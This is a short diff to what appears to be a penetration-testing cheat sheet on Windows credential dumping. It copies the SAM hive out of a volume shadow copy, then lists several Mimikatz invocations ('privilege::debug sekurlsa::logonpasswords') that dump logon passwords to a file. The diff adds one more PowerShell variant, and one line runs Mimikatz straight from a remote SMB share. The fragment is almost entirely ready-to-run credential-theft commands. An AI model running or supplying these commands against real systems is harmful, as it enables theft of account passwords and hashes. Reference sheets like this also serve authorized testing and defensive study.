@@ -37,8 +37,12 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM
 ### Mimikatz
 
 ```
+PS > .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > mimikatz_output.txt
+
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
 mimikatz.exe "privilege::debug; sekurlsa::logonpasswords; exit" >> mimikatz_output.txt
+
+
 
 **powershellz** \\172.16.5.225\share\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
 ```
